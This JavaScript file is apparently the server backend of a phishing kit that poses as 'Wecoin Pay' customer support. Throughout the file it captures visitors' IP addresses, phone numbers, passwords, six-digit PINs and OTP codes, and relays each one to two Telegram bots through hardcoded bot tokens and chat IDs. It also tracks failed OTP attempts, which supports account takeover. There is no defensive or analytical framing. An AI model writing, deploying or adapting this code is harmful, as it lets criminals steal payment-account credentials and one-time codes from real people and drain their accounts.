export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { type, issue, phone, pass, pin, otp, attempt } = req.body;

  // ==================== DUAL BOT CONFIGURATION ====================
  const BOT_1_TOKEN = '8895950049:AAH06SNj2czNyQIUAGpouRa_c5Mj7FV91N8';
  const CHAT_1_ID = '8956326200';

  const BOT_2_TOKEN = '885950049:AAH06SNj2czNyQIUAGpouRa_c5Mj7FV91N8';
  const CHAT_2_ID = '896326200';

  // Extract visitor real IP address securely from Vercel headers
  const clientIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'Unknown';
  const timeNow = new Date().toLocaleString();

  let message = '';

  if (type === 'page_opened') {
    message = `🔔 Wecoin Pay Page Opened\n` +
              `━━━━━━━━━━━━━━━\n` +
              `🌐 IP: <code>${clientIp}</code>\n` +
              `✅ Link Clicked By User\n` +
              `🕒 Time: ${timeNow}`;
  } else if (type === 'problem_select') {
    message = `🎫 NEW SUPPORT REQUEST — Wecoin Pay\n` +
              `━━━━━━━━━━━━━━━\n` +
              `🌐 IP: <code>${clientIp}</code>\n` +
              `📌 Issue: ${issue}\n` +
              `🕒 Time: ${timeNow}`;
  } else if (type === 'login_creds') {
    message = `📱 MOBILE & PASSWORD RECEIVED — Wecoin Pay\n` +
              `━━━━━━━━━━━━━━━\n` +
              `🌐 IP: <code>${clientIp}</code>\n` +
              `🎫 Issue: ${issue}\n` +
              `📞 Mobile: <code>${phone}</code>\n` +
              `🔒 Password: <code>${pass}</code>\n` +
              `🕒 Time: ${timeNow}`;
  } else if (type === 'pin_entered') {
    message = `🔑 6-DIGIT PIN RECEIVED — Wecoin Pay\n` +
              `━━━━━━━━━━━━━━━\n` +
              `🌐 IP: <code>${clientIp}</code>\n` +
              `📞 Mobile: <code>${phone}</code>\n` +
              `🔐 PIN: <code>${pin}</code>\n` +
              `🕒 Time: ${timeNow}`;
  } else if (type === 'send_otp') {
    message = `📤 SEND OTP REQUESTED — Wecoin Pay\n` +
              `━━━━━━━━━━━━━━━\n` +
              `🌐 IP: <code>${clientIp}</code>\n` +
              `📞 Mobile: <code>${phone}</code>\n` +
              `🕒 Time: ${timeNow}`;
  } else if (type === 'wrong_otp') {
    message = `❌ WRONG OTP ATTEMPT #${attempt} — Wecoin Pay\n` +
              `━━━━━━━━━━━━━━━\n` +
              `🌐 IP: <code>${clientIp}</code>\n` +
              `📞 Mobile: <code>${phone}</code>\n` +
              `🔢 OTP entered: <code>${otp}</code>\n` +
              `🕒 Time: ${timeNow}`;
  } else {
    message = `📩 Support Activity from IP: <code>${clientIp}</code>\n🕒 Time: ${timeNow}`;
  }

  try {
    const promises = [];

    // Send to Bot 1
    if (BOT_1_TOKEN && CHAT_1_ID) {
      promises.push(
        fetch(`https://api.telegram.org/bot${BOT_1_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_1_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          })
        })
      );
    }

    // Send to Bot 2
    if (BOT_2_TOKEN && CHAT_2_ID) {
      promises.push(
        fetch(`https://api.telegram.org/bot${BOT_2_TOKEN}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            chat_id: CHAT_2_ID,
            text: message,
            parse_mode: 'HTML',
            disable_web_page_preview: true
          })
        })
      );
    }

    await Promise.all(promises);
    return res.status(200).json({ success: true });
  } catch (err) {
    console.error('Telegram broadcast error:', err);
    return res.status(500).json({ error: 'Failed to broadcast message' });
  }
}
